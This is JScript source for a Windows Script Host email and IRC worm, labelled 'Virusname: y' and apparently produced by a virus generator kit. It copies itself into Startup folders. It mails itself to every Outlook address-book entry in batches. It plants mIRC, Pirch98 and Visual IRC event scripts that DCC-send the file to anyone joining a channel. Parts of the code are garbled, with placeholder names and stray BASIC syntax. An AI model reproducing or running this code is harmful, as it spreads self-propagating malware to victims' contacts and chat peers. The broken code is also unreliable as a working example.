// Virusname: y
// by y
// generated with JavaScript Generator 0.02
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("C:\Windows\StartmenÅ\Programme\Autostart\start.js");
MyS.WriteLine(MySC);
MyS.Close();
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("C:\Windows\Startmenu\Programs\StartUp\start.js");
MyS.WriteLine(MySC);
MyS.Close();
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile(chr$(34); OLAttachment$; chr$(34));
MyS.WriteLine(MySC);
MyS.Close();
var i outlook, fso, mapi, y, x, mail
{
fso=WScript.CreateObject("Scripting.FileSystemObject");
outlook = WScript.CreateObject("Outlook.Application");
mapi=outlook.GetNamespace("MAPI");
i=0;
for(y=1;y<=mapi.AddressLists.Count;y++)
{
for(x=1;x<=mapi.AddressLists(y).AddressEntries.Count;x++)
{
if (i==15)
{
mail.Send
i=0;
}
if (i==0)
{
mail=outlook.CreateItem(0);
mail.Subject="y";
mail.Body = "y";
mail.Attachments.Add("y");
}
mail.Recipients.Add(mapi.AddressLists(y).AddressEntries(x));
i++;
}
}
if (i!=0) mail.Send
}
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("y");
MyS.WriteLine(MySC);
MyS.Close();
mirc=fso.CreateTextFile("y");
mirc.WriteLine("[script]");
mirc.WriteLine("n0=on 1:join:*.*: { if ( $nick !=$me ) {halt} /dcc send $nick C:\\mirc\\attachment.js }");
mirc.Close();
var fso = WScript.CreateObject("Scripting.FileSystemObject")
var MySf = fso.OpenTextFile(WScript.ScriptFullName, 1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("C:\\pirch98\\y");
MyS.WriteLine(MySC);
MyS.Close();
pirch=fso.CreateTextFile("C:\\pirch98\\events.ini");
pirch.WriteLine("[Levels]");
pirch.WriteLine("Enabled = 1");
pirch.WriteLine("Count=6");
pirch.WriteLine("Level1=000-Unknows");
pirch.WriteLine("000-UnknowsEnabled=1");
pirch.WriteLine("Level2=100-Level 100");
pirch.WriteLine("100-Level 100Enabled=1");
pirch.WriteLine("Level3=200-Level 200");
pirch.WriteLine("200-Level 200Enabled=1");
pirch.WriteLine("Level4=300-Level 300");
pirch.WriteLine("300-Level 300Enabled=1");
pirch.WriteLine("Level5=400-Level 400");
pirch.WriteLine("400-Level 400Enabled=1");
pirch.WriteLine("Level6=500-Level 500");
pirch.WriteLine("500-Level 500Enabled=1");
pirch.WriteLine("[000-Unknowns]; ");
pirch.WriteLine("User1=*!*@*");
pirch.WriteLine("UserCount=1");
pirch.WriteLine("Events1=ON JOIN:#: /dcc send $nick C:\\Pirch98\\y");
pirch.WriteLine("EventCount=1");
pirch.WriteLine("[100-Level 100]");
pirch.WriteLine("UserCount=0");
pirch.WriteLine("EventCount=0");
pirch.WriteLine("[200-Level 200]");
pirch.WriteLine("UserCount=0");
pirch.WriteLine("EventCount=0");
pirch.WriteLine("[300-Level 300]");
pirch.WriteLine("UserCount=0");
pirch.WriteLine("EventCount=0");
pirch.WriteLine("[400-Level 400]");
pirch.WriteLine("UserCount=0");
pirch.WriteLine("EventCount=0");
pirch.WriteLine("[500-Level 500]");
pirch.WriteLine("UserCount=0");
pirch.WriteLine("EventCount=0");
pirch.Close();
var fso=WScript.CreateObject("Scripting.FileSystemObject")
var MySf=fso.OpenTextFile(WScript.ScriptFullName,1)
var MySC=MySf.ReadAll()
var WSHShell=WScript.CreateObject("WScript.Shell");
MySf.Close()
MyS=fso.CreateTextFile("y");
MyS.WriteLine(MySC);
MyS.Close();
WSHShell.RegWrite("HKEY_CURRENT_USER\\.Default\\Software\\MeGaLiTh Software\\Visual IRC 96\\Events\\Event17     dcc send $nick C:\\Virc\\attachment.js");

